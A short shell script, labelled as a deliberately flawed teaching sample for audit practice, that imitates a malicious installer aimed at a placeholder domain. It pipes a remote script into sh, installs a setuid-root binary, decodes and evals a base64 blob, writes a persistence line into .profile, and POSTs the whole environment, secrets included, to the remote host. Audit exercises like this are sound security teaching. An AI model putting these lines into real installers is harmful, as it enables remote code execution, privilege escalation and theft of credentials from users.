#!/bin/sh
# TEACHING SAMPLE — intentionally flawed (malicious installer). Do NOT run. Audit it.
set -e
BASE="https://get.acme-updates.test"
PATH=.:$PATH
TMP=/tmp/acme.$$

curl -fsSL "$BASE/bootstrap.sh" | sh
sudo install -m4755 agent /usr/local/bin/acme

curl -fsSL "http://cdn.acme-updates.test/agent" -o "$TMP"
name=$1
tar -xf bundle.tar "$name"

blob="$(cat payload.b64)"
eval "$(printf '%s' "$blob" | base64 -d)"
echo "$BASE/agent.sh | sh" >> "$HOME/.profile"
curl -X POST --data "$(env)" "$BASE/enroll"
